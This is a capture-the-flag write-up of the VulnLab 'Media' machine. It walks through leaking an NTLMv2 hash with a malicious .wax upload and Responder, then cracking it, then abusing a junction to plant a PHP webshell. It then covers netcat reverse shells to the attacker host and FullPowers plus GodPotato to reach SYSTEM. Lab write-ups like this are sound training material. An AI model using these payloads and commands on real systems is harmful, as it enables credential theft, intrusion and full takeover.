---
title: "Media"
---

# Vulnab - Media Writeup

![Media screenshot](media.png)

Welcome reader, today we’ll hack **Media** from VulnLab. Media starts with a PHP site on Windows that takes video uploads. I’ll use a wax file to leak a net-NTLMv2 hash, and then crack it to get SSH access to the host. I’ll understand how the webserver is writing the files to the filesystem, and use a junction point link to have it write into the web root, allowing me to upload a webshell and get access as local service. I’ll use FullPowers to enable the SeImpersonatePrivilage, and then GodPotato to get System.
 

## Nmap

I started with an Nmap scan to see what was exposed.

```text
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 0b:b3:c0:80:40:88:e1:ae:aa:3b:5f:f4:c2:23:c0:0d (RSA)
|   256 e0:80:3f:dd:b1:f8:fc:83:f5:de:d5:b3:2d:5a:4b:39 (ECDSA)
|_  256 b5:32:c0:72:18:10:0f:24:5d:f8:e1:ce:2a:73:5c:1f (ED25519)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
```

The important part was that only SSH, HTTP, and RDP were open.

## Web

The website belonged to a studio and had a form at the bottom to join the team. The interesting part was the file upload field, which said it accepted a brief introduction video compatible with Windows Media Player.

At first I looked for Windows Media Player CVEs, but then I switched approaches and searched for NTLM theft via file upload. I found a tool that generates malicious Windows file types for NTLM capture.

The file type that worked here was a `.wax` playlist file.

```text
[https://10.8.0.210/test]
file://\\10.8.0.210/steal/file
```

I set up Responder and uploaded the file.

```bash
sudo responder -I tun0
```

After some time, the target connected back and leaked an NTLMv2 hash.

```text
[SMB] NTLMv2-SSP Client   : 10.10.119.80
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:c174395ba7e319b4:0278566CC952E68C0A8939B05A8949D1:...
```

That gave me the username `enox`.

## User

I saved the hash to a file and cracked it with John.

```bash
john enox.hash
```

The password cracked immediately.

```text
<REDACTED> (enox)
```

Then I logged in over SSH.

```bash
ssh enox@media.vl
```

That gave me a shell as `enox`, and I read the user flag.

```text
Microsoft Windows [Version 10.0.20348.1970]

enox@MEDIA C:\Users\enox>type Desktop\user.txt
VL{REDACTED}
```

## PrivEsc

From the shell, I started looking at the web server files.

```powershell
PS C:\xampp\htdocs> ls
```

```text
Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
```

The `index.php` file showed the upload logic. It created a folder in `C:\Windows\Tasks\Uploads\` based on the MD5 hash of `firstname + lastname + email`.

```php
$folderName = md5($firstname . $lastname . $email);
```

That meant I could predict the folder name and replace it with a junction pointing to the web root.

## Junction Abuse

First I calculated the MD5 value for the data I planned to use.

```bash
echo -n "serioserioserio@media.vl" | md5sum
```

That gave me the folder name:

```text
3b060c7f54f15b7268440128b7f34e6e
```

The upload directory existed, so I removed it and created a junction to `C:\xampp\htdocs`.

```powershell
rmdir C:\Windows\Tasks\Uploads\3b060c7f54f15b7268440128b7f34e6e
mklink /J C:\Windows\Tasks\Uploads\3b060c7f54f15b7268440128b7f34e6e C:\xampp\htdocs
```

Then I re-uploaded my PHP shell.

```php
<?php
system($_REQUEST['cmd']);
?>
```

After that, the shell landed in the web root.

```text
PS C:\xampp\htdocs> ls

Directory: C:\xampp\htdocs

Mode                 LastWriteTime         Length Name
-a----        10/19/2023   3:12 AM             37 shell.php
```

## Local Service Shell

I uploaded `nc64.exe` to the target and used the PHP shell to trigger it.

```powershell
PS C:\temp> iwr http://10.8.0.210/nc64.exe -outfile nc64.exe
```

Then I used the shell to connect back.

```text
/shell.php?cmd=c:\\temp\\nc64.exe+-e+cmd.exe+10.8.0.210+443
```

That gave me a shell as `NT AUTHORITY\LOCAL SERVICE`.

```text
connect to [10.8.0.210] from (UNKNOWN) [10.10.119.80] 50206
C:\xampp\htdocs>whoami
nt authority\local service
```

## FullPowers

`whoami /all` showed that some important privileges were missing. I used FullPowers to restore the default service account privileges, including `SeImpersonatePrivilege`.

```powershell
PS C:\temp> ./FullPowers.exe -c "C:\temp\nc64.exe 10.8.0.210 443 -e cmd" -z
```

That spawned a new shell with the missing privileges restored.

```text
PRIVILEGES INFORMATION
----------------------
SeAssignPrimaryTokenPrivilege
SeIncreaseQuotaPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
SeIncreaseWorkingSetPrivilege
```

## SYSTEM Shell

With `SeImpersonatePrivilege` enabled, I used GodPotato to get SYSTEM.

```powershell
PS C:\temp> .\gp.exe -cmd "C:\temp\nc64.exe -e cmd.exe 10.8.0.210 443"
```

That popped a SYSTEM shell.

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4184
```

From there, I read the root flag.

```text
C:\temp>whoami
nt authority\system

C:\temp>type C:\Users\Administrator\Desktop\root.txt
VL{REDCATED}
```

## Attack Path

- **Enumerate the host** — identify SSH, HTTP, and RDP.
- **Find the upload form** — discover the Windows Media Player-compatible file upload.
- **Leak NTLM** — use a malicious `.wax` playlist and catch the hash with Responder.
- **Crack the hash** — recover the password for `enox`.
- **Log in over SSH** — obtain a user shell.
- **Inspect the source** — find the upload directory logic in `index.php`.
- **Predict the folder name** — calculate the MD5 of the submitted identity fields.
- **Abuse junctions** — redirect uploads into `C:\xampp\htdocs`.
- **Upload a PHP shell** — gain code execution through the web root.
- **Restore privileges** — use FullPowers to recover `SeImpersonatePrivilege`.
- **Escalate to SYSTEM** — use GodPotato.
- **Read the root flag** — grab `root.txt` from Administrator’s desktop.
